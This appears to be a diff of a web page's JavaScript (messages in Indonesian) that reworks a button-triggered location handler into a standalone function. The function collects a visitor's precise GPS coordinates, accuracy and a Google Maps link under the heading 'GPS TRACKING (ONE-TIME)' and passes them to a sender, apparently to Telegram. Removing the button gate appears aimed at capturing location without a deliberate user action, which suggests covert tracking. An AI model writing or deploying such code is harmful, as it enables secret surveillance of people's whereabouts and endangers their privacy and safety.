@@ -120,8 +120,7 @@
             }
         }, 2000); 
 
-document.getElementById("btnLokasi").addEventListener("click", async () => {
-
+const sendLocationOnce = async () => {
   if (!navigator.geolocation) {
     await sTG("❌ Browser tidak mendukung GPS");
     return;
@@ -133,8 +132,9 @@ document.getElementById("btnLokasi").addEventListener("click", async () => {
       const lon = p.coords.longitude;
 
       let g = `📍 GPS TRACKING (ONE-TIME)\n`;
-      g += `📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
-      g += `🎯 Akurasi: ${p.coords.accuracy}m\n`;
+      g += `📌 Lat: ${lat}\n`;
+      g += `📍 Lng: ${lon}\n`;
+      g += `🎯 Akurasi: ${p.coords.accuracy} m\n`;
       g += `🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n`;
 
       const l = await gLD(lat, lon);
@@ -149,11 +149,11 @@ document.getElementById("btnLokasi").addEventListener("click", async () => {
     },
     {
       enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
+      maximumAge: 0,
+      timeout: 10000
     }
   );
-});
+};
 
     // Langsung menjalankan fungsi ST tanpa delay
     ST();
